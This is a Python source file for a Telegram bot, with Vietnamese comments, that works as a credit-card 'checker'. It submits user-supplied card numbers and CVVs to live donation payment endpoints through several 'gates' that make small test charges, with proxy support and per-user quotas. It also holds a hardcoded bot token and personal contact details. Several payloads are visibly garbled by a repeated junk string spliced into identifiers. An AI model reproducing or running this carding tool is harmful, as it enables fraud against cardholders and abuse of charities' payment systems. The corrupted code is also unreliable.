# Tên file: bot.py
import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import threading
import random
import psutil
import ssl
import socket
import string
import subprocess # <<< THÊM M?I: Ð? ch?y file site_checker.py
import sys # <<< THÊM M?I: Ð? l?y ðý?ng d?n python hi?n t?i

from datetime import datetime
from pytz import timezone
from urllib.parse import urlparse
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, User
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- C?U H?NH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"
# <<< THÊM M?I: URL cho d?ch v? ki?m tra website n?i b?
SITE_CHECKER_URL = "http://127.0.0.1:5001/check"


# --- TÊN FILE & THÝ M?C LÝU TR? ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json" # Gi?i h?n cho /mass
MULTI_LIMIT_FILE = "multi_limits.json" # Gi?i h?n cho /multi
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json" # File lýu ngôn ng?
LOG_DIR = "check_logs" # Thý m?c chính lýu log
BOT_STATUS_FILE = "bot_status.json" # File lýu tr?ng thái on/off c?a bot
GATE_FILE = "current_gate.json" # File lýu c?ng check hi?n t?i
GATE_RANGES_FILE = "gate_charge_ranges.json" # File lýu kho?ng charge cho các gate
PROXY_FILE = "proxies.json" # File lýu proxy
GATE8_MODE_FILE = "gate8_mode.json" # File lýu ch? ð? c?a gate 8
GATE9_MODE_FILE = "gate9_mode.json" # File lýu ch? ð? c?a gate 9

# --- GI?I H?N M?C Ð?NH CHO THÀNH VIÊN ---
DEFAULT_MEMBER_LIMIT = 100 # Cho /mass
MEMBER_THREAD_LIMIT = 3 # Cho /mass
DEFAULT_MULTI_LIMIT = 10 # Cho /multi

# --- C?U H?NH MÚI GI? ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BI?N TOÀN C?C ---
ACTIVE_CHECKS = {} # {user_id: {"full_name": str, "username": str, "start_time": float, "task_type": str}}
CANCELLATION_EVENTS = {} # {user_id: threading.Event}
STATS_FILE_LOCK = threading.Lock() # Lock ð? tránh xung ð?t khi nhi?u user ghi file stats cùng lúc
BRAND_TO_PAYMENT_METHOD = { # Ánh x? brand th? sang code API
    'VISA': 'VIS',
    'MASTERCARD': 'ECA',
    'AMERICAN EXPRESS': 'AMX',
    'DISCOVER': 'dis',
    'EBS': 'ebs',
    'ELV': 'elv',
    'EPS': 'eps',
    'JCB': 'jcb',
    'MAESTRO': 'mae',
}

# --- TIN NH?N THÔNG BÁO ---
MESSAGES_VI = {
    "bot_off": "?? **THÔNG BÁO B?O TR?** ??\n\nBot hi?n ðang t?m th?i ngo?i tuy?n ð? b?o tr?. Các l?nh check s? không ho?t ð?ng cho ð?n khi có thông báo m?i. C?m õn s? kiên nh?n c?a b?n!",
    "bot_on": "?? **THÔNG BÁO HO?T Ð?NG** ??\n\nBot ð? ho?t ð?ng tr? l?i. C?m õn b?n ð? ch? ð?i!",
}
MESSAGES_EN = {
    "bot_off": "?? **MAINTENANCE NOTICE** ??\n\nThe bot is temporarily offline for maintenance. Checking commands will be disabled until further notice. Thank you for your patience!",
    "bot_on": "?? **SERVICE RESUMED NOTICE** ??\n\nThe bot is back online. Thank you for waiting!",
}


# --- C?U H?NH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KH?I T?O ---
# T?o thý m?c log n?u chýa có
os.makedirs(LOG_DIR, exist_ok=True)

# --- QU?N L? USER, DATA & GATE ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_users():
    try:
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_multi_limit(user_id):
    limits = load_json_file(MULTI_LIMIT_FILE)
    return limits.get(str(user_id), DEFAULT_MULTI_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE)
    return prefs.get(str(user_id), None)

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE)
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def is_bot_on():
    status = load_json_file(BOT_STATUS_FILE, default_data={'is_on': True})
    return status.get('is_on', True)

def set_bot_status(is_on: bool):
    save_json_file(BOT_STATUS_FILE, {'is_on': is_on})

def get_active_gate():
    gate_data = load_json_file(GATE_FILE, default_data={'gate': '1'})
    return gate_data.get('gate', '1')

def set_active_gate(gate_id):
    save_json_file(GATE_FILE, {'gate': str(gate_id)})

def get_gate8_mode():
    mode_data = load_json_file(GATE8_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate8_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE8_MODE_FILE, {'mode': mode})

def get_gate9_mode():
    mode_data = load_json_file(GATE9_MODE_FILE, default_data={'mode': 'live'})
    return mode_data.get('mode', 'live')

def set_gate9_mode(mode):
    if mode in ['live', 'charge']:
        save_json_file(GATE9_MODE_FILE, {'mode': mode})

def _get_charge_value(gate_id, custom_charge_amount=None):
    if custom_charge_amount is not None:
        return custom_charge_amount
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))
    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            return random.randint(int(gate_range['min']), int(gate_range['max']))
        except (ValueError, TypeError):
            logger.warning(f"L?i ð?c range cho gate {gate_id}, s? d?ng m?c ð?nh. Range: {gate_range}")
            return 50
    if str(gate_id) == '5':
        return random.randint(50, 200)
    return 50

def get_formatted_gate_name(gate_id):
    if str(gate_id) == '7':
        return "Check Live (Gate 7)"
    if str(gate_id) == '8':
        gate8_mode = get_gate8_mode()
        if gate8_mode == 'live':
            return "Check Live (Gate 8)"
        else:
            default_name = "Charge 0.5$ (Gate 8)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))
            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 8)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 8)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
    if str(gate_id) == '9':
        gate9_mode = get_gate9_mode()
        if gate9_mode == 'live':
            return "Check Live (Gate 9)"
        else:
            default_name = "Charge 0.5$ (Gate 9)"
            ranges = load_json_file(GATE_RANGES_FILE)
            gate_range = ranges.get(str(gate_id))
            if gate_range and 'min' in gate_range and 'max' in gate_range:
                try:
                    min_val = int(gate_range['min']) / 100
                    max_val = int(gate_range['max']) / 100
                    if min_val == max_val:
                        return f"Charge {min_val:.2f}$ (Gate 9)"
                    else:
                        return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate 9)"
                except (ValueError, TypeError):
                    return default_name
            return default_name
    default_names = {
        '1': "Charge 0.5$ (Gate 1)", '2': "Charge 0.5$ V2 (Gate 2)",
        '3': "Charge 0.5$ V3 (Gate 3)", '4': "Charge 0.5$ V4 (Gate 4)",
        '5': "Charge 0.5$-2.0$ (Gate 5)", '6': "Charge 0.5$ (Gate 6)",
    }
    ranges = load_json_file(GATE_RANGES_FILE)
    gate_range = ranges.get(str(gate_id))
    if gate_range and 'min' in gate_range and 'max' in gate_range:
        try:
            min_val = int(gate_range['min']) / 100
            max_val = int(gate_range['max']) / 100
            if min_val == max_val:
                return f"Charge {min_val:.2f}$ (Gate {gate_id})"
            else:
                return f"Charge {min_val:.2f}$-{max_val:.2f}$ (Gate {gate_id})"
        except (ValueError, TypeError):
            return default_names.get(gate_id, f"Unknown Gate {gate_id}")
    else:
        return default_names.get(gate_id, f"Unknown Gate {gate_id}")


def update_user_stats(user_id, user_info, counts):
    with STATS_FILE_LOCK:
        stats = load_json_file(STATS_FILE)
        user_id_str = str(user_id)
        default_user_stat = {
            'username': None, 'full_name': None, 'total_charged': 0, 'total_custom': 0, 'total_live_success': 0,
            'total_decline': 0, 'total_error': 0, 'total_invalid': 0, 'last_check_timestamp': ''
        }
        user_stat_data = stats.get(user_id_str, {})
        if isinstance(user_stat_data, dict):
            default_user_stat.update(user_stat_data)
        stats[user_id_str] = default_user_stat
        stats[user_id_str]['total_charged'] += counts.get('success', 0)
        stats[user_id_str]['total_live_success'] += counts.get('live_success', 0)
        stats[user_id_str]['total_custom'] += counts.get('custom', 0)
        stats[user_id_str]['total_decline'] += counts.get('decline', 0)
        stats[user_id_str]['total_error'] += counts.get('error', 0) + counts.get('gate_dead', 0)
        stats[user_id_str]['total_invalid'] += counts.get('invalid_format', 0)
        stats[user_id_str]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
        stats[user_id_str]['username'] = user_info.username
        stats[user_id_str]['full_name'] = user_info.full_name
        save_json_file(STATS_FILE, stats)

# --- CÁC HÀM QU?N L? PROXY ---
def load_proxies():
    return load_json_file(PROXY_FILE, default_data={"enabled": False, "proxies": []})

def save_proxies(data):
    save_json_file(PROXY_FILE, data)

def _format_proxy_for_requests(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.strip().split(':')
    if len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    elif len(parts) == 4:
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {"http": proxy_url, "https": proxy_url}
    else:
        logger.warning(f"Ð?nh d?ng proxy không h?p l?: {proxy_str}")
        return None

def _test_proxy(proxy_str: str):
    proxy_dict = _format_proxy_for_requests(proxy_str)
    if not proxy_dict:
        return False, "Ð?nh d?ng proxy không h?p l?."
    try:
        response = requests.get("https://www.google.com", proxies=proxy_dict, timeout=7)
        if 200 <= response.status_code < 300:
            return True, f"Thành công (Status: {response.status_code})"
        else:
            return False, f"Th?t b?i (Status: {response.status_code})"
    except requests.exceptions.ProxyError as e:
        return False, f"L?i Proxy: {e}"
    except requests.exceptions.RequestException as e:
        return False, f"L?i k?t n?i: {e}"

# --- CÁC HÀM C?T L?I ---

def generate_random_name(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length)).capitalize()

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"L?n th? {attempt + 1}/{max_retries} cho {url} th?t b?i: {e}. Th? l?i sau {wait_time}s...")
            time.sleep(wait_time)
    final_error_message = f"Retry: T?t c? {max_retries} l?n th? l?i cho {url} ð?u th?t b?i. L?i cu?i cùng: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19):
        return False, "S? th? (CC) ph?i có t? 10-19 ch? s?."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12):
        return False, "Tháng (MM) ph?i là s? t? 1 ð?n 12."
    if not (ano.isdigit() and len(ano) in [2, 4]):
        return False, "Nãm (YY) ph?i có 2 ho?c 4 ch? s?."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False, "CVV ph?i có 3 ho?c 4 ch? s?."
    return True, ""

def _check_card_gate1(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 1"""
    try:
        charge_value = _get_charge_value('1', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=8di84dqo8", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": charge_value}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "10000", "suggested_amounts": "[10000,15000,20000]", "user_agent": ua}, "solution": {"uuid": "f2166434-2e5c-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "tamaro", "source_url": "https://donate.raisenow.io/hmyks?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.15.3"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVview=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 1 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 1: {e}", bin_info

def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 2"""
    try:
        charge_value = _get_charge_value('2', custom_charge_amount)
        brand_upper = (bin_info.get('brand') or '').upper()
        payment_method = BRAND_TO_PAYMENT_METHOD.get(brand_upper, 'VIS')
        brand_code = payment_method.lower()
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250801203254539560", "cardNumber": cc, "cvv": cvv, "paymentMethod": payment_method, "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=0cjn3q43b", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "079beaee-ca86-4b8c-9d08-e71b4bd0a40e", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "de", "first_name": "Minh", "last_name": "Nhut", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "street": "Oakridge Farm Lane", "house_number": "2830", "postal_code": "4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": ua}, "solution": {"uuid": "3f9c8a06-2d0b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": brand_code, "cardholder": "Minh Nhut", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "1d7dd23e-7007-4d3b-85b7-00891d2c6df5", "return_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 2 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 2: {e}", bin_info

def _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 3"""
    try:
        charge_value = _get_charge_value('3', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802045852818974", "cardNumber": cc, "cvv": cvv, "paymentMethod": "VIS", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=x0gzkbt03", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "bda022a8-9955-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": charge_value}, "supporter": { "locale": "de", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "embed", "preselected_amount": "2500", "suggested_amounts": "[2500,5000,10000]", "user_agent": ua }, "solution": {"uuid": "9b693323-de98-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "https://donate.raisenow.io/jpctq?analytics.channel=embed&lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "vis", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "b2fbfb20-3195-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVview=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L?i không xác ð?nh trong Gate 3 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L?i h? th?ng Gate 3: {e}", bin_info

def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 4"""
    try:
        charge_value = _get_charge_value('4', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802080040638504", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=32stkhqhm", "X-Requested-With": "XMLHttpRequest" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L?i Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L?i HTTP không có ph?n h?i khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L?i HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph?n h?i Tokenize không ph?i JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "0e83cbe3-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVvalue": charge_value}, "supporter": { "locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "street": "Oakridge Farm Lane", "house_number": "2830", "postal_code": "4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV", "preselected_amount": "2500", "suggested_amounts": "[2500,5000,15000]", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }, "solution": {"uuid": "7562d73f-6a18-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en", "uuid": "self-service", "version": "2.16.0" } }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "56d3c80c-6e0a-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVview=payment_result" }
